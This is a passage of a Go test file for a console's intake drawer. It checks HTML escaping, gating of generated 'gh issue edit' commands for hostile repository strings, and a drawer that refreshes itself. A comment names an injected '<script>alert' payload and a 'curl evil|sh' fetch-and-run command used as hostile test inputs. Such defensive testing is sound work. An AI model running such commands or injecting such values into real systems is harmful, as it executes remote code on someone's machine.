	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, fixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	get := func(target string) string {
		req := httptest.NewRequest(http.MethodGet, target, nil)
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("%s: status = %d", target, w.Code)
		}
		return w.Body.String()
	}

	pageBody := get("http://site.test/console/intake")
	drawerHTML := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runHTML) + "&stage=" + url.QueryEscape(stageHTML))
	drawerShell := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runShell) + "&stage=" + url.QueryEscape(stageShell))
	combined := pageBody + drawerHTML + drawerShell

	if strings.Contains(combined, "<script>alert") {
		t.Error("raw <script>alert survived escaping in the intake surface")
	}
	// "gh issue edit" must be absent everywhere: the gate refuses to build ANY
	// command for a hostile repo, so neither hostile payload (the HTML
	// injection nor "curl evil|sh") can ever appear inside a gh command. This
	// is the gate assertion the brief calls for. The repo string legitimately
	// still renders as escaped, read-only display text elsewhere on the
	// card/drawer (e.g. the "Issue" field) — that is not a command and is not
	// asserted absent here.
	if strings.Contains(combined, "gh issue edit") {
		t.Error("gate must refuse ANY command for a hostile repo — repo pattern is a strict owner/repo allowlist")
	}
	if !strings.Contains(pageBody, "&lt;script") {
		t.Error(`expected escaped form "&lt;script" in page output; escaping did not occur`)
	}
	if strings.Contains(strings.ToLower(combined), "unblock available") {
		t.Error(`"unblock available" hint must be suppressed too — the gate refused, so UnblockAvailable must be false`)
	}
}

// CFAR (cross-family, P2): the drawer lives outside #console-intake-drawer's
// OOB-reset owner (consoleIssueScanFragment only resets on a freshness
// downgrade), so a later poll that stays FreshnessCurrent but changes the
// underlying labels/blockers left a stale command copyable. The fix is a
// self-refreshing drawer: assert the rendered <aside> carries the exact
// hx-get/hx-trigger/hx-swap attributes that make it re-request its own card
// URL every 10s.
func TestConsoleIntakeDrawerSelfRefreshes(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d", w.Code)
	}
	body := w.Body.String()
	// templ's attribute escaping (html.EscapeString) renders "&" as "&amp;" in
	// HTML attribute values, so the query-escaped card URL's "&" between run=
	// and stage= appears as "&amp;" in the served markup — assert on the
	// actual encoding, not the raw URL string.
	wantURL := `hx-get="/console/intake/card?run=run_docs_172_scope&amp;stage=select_and_design_approach"`
	for _, want := range []string{
		wantURL,
		`hx-trigger="every 10s"`,
		`hx-swap="outerHTML"`,
	} {
		if !strings.Contains(body, want) {
			t.Errorf("drawer missing %q; body:\n%s", want, body)
		}
	}
}

// CFAR (cross-family, P2), proof of the fix's actual effect: a drawer opened
// against a FreshnessCurrent projection renders a real gh command; once the
// underlying label evidence changes (still FreshnessCurrent — no downgrade,
// so the board's OOB reset never fires), a re-request of the SAME drawer URL
// must re-derive the plan and drop the command, because the mismatch gate
// (consoleIssueScanUnblockPlan) refuses a needs_human_scope blocker no longer
// corroborated by cc:needs-human-scope or cc:pr-deferred. This is what the
// drawer's 10s self-refresh (TestConsoleIntakeDrawerSelfRefreshes) actually
// buys operationally.
func TestConsoleIntakeDrawerRefreshDropsCommandWhenLabelsChange(t *testing.T) {
	fresh := freshHiveCivilizationAssemblyProjectionFixture()

	// Scope the label-surgery precisely to the run_docs_172_scope run block:
	// the same "cc:needs-human-scope" label string also appears verbatim in
	// unrelated runs (e.g. run_docs_172's blockers), so a global replace
	// across the whole fixture would corrupt data this test doesn't own.
	// Isolate the run_docs_172_scope run object by its run_id anchor and its
	// closing "source_refs" line, replace only within that slice, then splice
	// it back — this guarantees every other run/blocker in the fixture is
	// untouched.
	const blockStart = `"run_id": "run_docs_172_scope",`
	const blockEnd = `"source_refs": ["github:transpara-ai/docs#172"]`
	startIdx := strings.Index(fresh, blockStart)
	if startIdx == -1 {
		t.Fatal("run_docs_172_scope run block not found in fixture; fixture format changed")
	}
	endIdx := strings.Index(fresh[startIdx:], blockEnd)
	if endIdx == -1 {
		t.Fatal("run_docs_172_scope run block close marker not found; fixture format changed")
	}
	endIdx += startIdx + len(blockEnd)
	block := fresh[startIdx:endIdx]

	const needsHumanScopeLabel = `"labels": ["cc:needs-human-scope"]`
	wantOccurrences := strings.Count(block, needsHumanScopeLabel)
	if wantOccurrences == 0 {
		t.Fatal("run_docs_172_scope run block does not contain cc:needs-human-scope; fixture format changed")
	}
	modifiedBlock := strings.ReplaceAll(block, needsHumanScopeLabel, `"labels": ["cc:pr-ready"]`)
	if modifiedBlock == block {
		t.Fatal("label surgery made no change to the run_docs_172_scope block")
	}
	modifiedFixture := fresh[:startIdx] + modifiedBlock + fresh[endIdx:]

	// Verify the surgery kept valid JSON and left the sibling run_docs_172
	// blocker's identical label string alone.
	var parsed map[string]any
	if err := json.Unmarshal([]byte(modifiedFixture), &parsed); err != nil {
		t.Fatalf("modified fixture is not valid JSON: %v", err)
	}
	if strings.Count(modifiedFixture, needsHumanScopeLabel) != strings.Count(fresh, needsHumanScopeLabel)-wantOccurrences {
		t.Fatal("label surgery leaked outside the run_docs_172_scope block")
	}

	// Servable, swappable fixture: starts by serving the ORIGINAL fresh
	// fixture (command present), then is swapped to serve the MODIFIED fresh
	// fixture (label removed) before the second request — simulating another
	// operator's label edit landing between two polls of the same open
	// drawer.
	var mu sync.Mutex
	current := fresh
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		body := current
		mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, body)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	drawerURL := "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach"
	get := func() string {
		req := httptest.NewRequest(http.MethodGet, drawerURL, nil)
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("status = %d", w.Code)
		}
		return w.Body.String()
	}

	firstBody := get()
	if !strings.Contains(firstBody, "gh issue edit") {
		t.Fatal("first request must render the unblock command, or this test proves nothing about the refresh")
	}

	mu.Lock()
	current = modifiedFixture
	mu.Unlock()

	secondBody := get()
	if strings.Contains(secondBody, "gh issue edit") {
		t.Error("refreshed drawer still rendered a gh command after cc:needs-human-scope was removed — mismatch gate must refuse (blocker needs_human_scope without corroborating label)")
	}
	if !strings.Contains(secondBody, "human must clarify issue scope before runtime continues") {
		t.Error("refreshed drawer must still render the projected required action honestly, even when the gate refuses a command")
	}
}

func sourceMarkerProjectionForConsoleTest(transition string) OpsCivilizationIssueScanSourceMarkerProjected {
	workRef := OpsCivilizationIssueScanMarkerWorkRef{
		SchemaVersion:          "1",
		ProjectionKind:         "work.issue_scan.source_marker_ref",
		CanonicalSource:        "work",
		ProjectionOnly:         true,
		RunID:                  "2026-07-06-docs-256",
		Target:                 OpsCivilizationIssueScanMarkerTargetRef{Repository: "transpara-ai/docs", IssueNumber: 256},
		Stage:                  "research_issue_and_repo_context",
		StageNumber:            1,
		Gate:                   "research_packet_posted",
		TaskID:                 "019f5000-0000-7000-8000-000000000256",
		CanonicalTaskID:        "tsk_issue_scan_docs_256_research",
		FactoryOrderID:         "fo_issue_scan_docs_256",
		RequirementIDs:         []string{"req_issue_scan_docs_256_research"},
		AcceptanceCriterionIDs: []string{"ac_issue_scan_docs_256_research"},
		LifecycleState:         "created",
		MissingGates:           []string{"definition_of_done"},
		VerificationRefs:       OpsCivilizationIssueScanMarkerEvidenceRefs{TestCaseIDs: []string{"tc_source_marker"}, GateResultIDs: []string{"gate_source_marker"}},
		FailureRepairRefs:      OpsCivilizationIssueScanMarkerEvidenceRefs{WaiverIDs: []string{"waiver_repair_marker"}},
		SourceIssueRefs:        []string{"github:transpara-ai/docs#256"},
		AuthorityExclusions: []string{
			"github_issue_markers_are_projection_only",
			"github_comments_are_not_work_lifecycle_truth",
			"github_labels_are_not_work_lifecycle_truth",
			"no_live_github_mutation_authority",
		},
	}
	marker := OpsCivilizationIssueScanSourceMarkerProjected{
		SchemaVersion:       "1",
		ProjectionKind:      "eventgraph.issue_scan.source_marker_projection",
		Transition:          transition,
		RunID:               workRef.RunID,
		Target:              OpsCivilizationIssueRef{Repo: workRef.Target.Repository, Number: workRef.Target.IssueNumber, URL: "https://github.com/transpara-ai/docs/issues/256", State: "open"},
		StageID:             workRef.Stage,
		StageNumber:         workRef.StageNumber,
		Gate:                workRef.Gate,
		WorkRef:             workRef,
		ActorID:             "agent:eventgraph-projection",
		ActorRole:           "projection_recorder",
		OccurredAt:          "2026-07-06T14:00:00Z",
		IdempotencyKey:      "issuescan-source-marker:2026-07-06-docs-256:" + transition,
		AuthorityBoundary:   "projection only; no GitHub mutation",
		AuthorityExclusions: append([]string(nil), workRef.AuthorityExclusions...),
		EvidenceRefs:        OpsCivilizationIssueScanMarkerEvidenceRefs{TestCaseIDs: []string{"tc_source_marker"}, GateResultIDs: []string{"gate_source_marker"}},
		SourceRefs:          []string{"eventgraph:issuescan.source.marker.projected:evt-" + transition, "work:fo_issue_scan_docs_256"},
		GitHubMarker: &OpsCivilizationIssueScanGitHubMarkerRef{
			System:         "github",
			Repository:     "transpara-ai/docs",
			IssueNumber:    256,
			CommentID:      "planned-marker-comment",
			LabelNames:     []string{"factory:acquired"},
			DerivedOutput:  true,
			ProjectionSink: true,
		},
		CanonicalSource: "work_eventgraph_projection",
		ProjectionOnly:  true,
	}
	switch transition {
	case "parked_human_action":
		marker.WorkRef.LifecycleState = "blocked"
		marker.WorkRef.Blocked = true
		marker.WorkRef.LatestBlocker = &OpsCivilizationIssueScanMarkerBlockerRef{
			Reason:       "stale_target",
			Detail:       "source issue changed after acquisition",
			EvidenceRefs: []string{"eventgraph:blocker:stale-target"},
		}
		marker.StaleTarget = true
		marker.GitHubMarker.LabelNames = []string{"factory:parked"}
	case "ready_for_human":
		marker.WorkRef.LifecycleState = "ready"
		marker.WorkRef.Ready = true
		marker.GitHubMarker.LabelNames = []string{"factory:ready-for-human"}
	case "completed":
		marker.WorkRef.LifecycleState = "certified"
		marker.WorkRef.LatestGate = &OpsCivilizationIssueScanMarkerGateRef{
			Gate:         marker.Gate,
			EvidenceRefs: []string{"eventgraph:gate:certified"},
		}
		marker.GitHubMarker.LabelNames = []string{"factory:completed"}
	case "abandoned":
		marker.WorkRef.LifecycleState = "rejected"
		marker.GitHubMarker.LabelNames = []string{"factory:abandoned"}
	case "superseded":
		marker.WorkRef.LifecycleState = "superseded"
		marker.WorkRef.SupersededBy = "tsk_replacement_source_marker"
		marker.SupersededBy = "tsk_replacement_source_marker"
		marker.GitHubMarker.LabelNames = []string{"factory:superseded"}
	}
	return marker
}

func consoleTestHasString(items []string, want string) bool {
	for _, item := range items {
		if item == want {
			return true
		}
	}
	return false
}
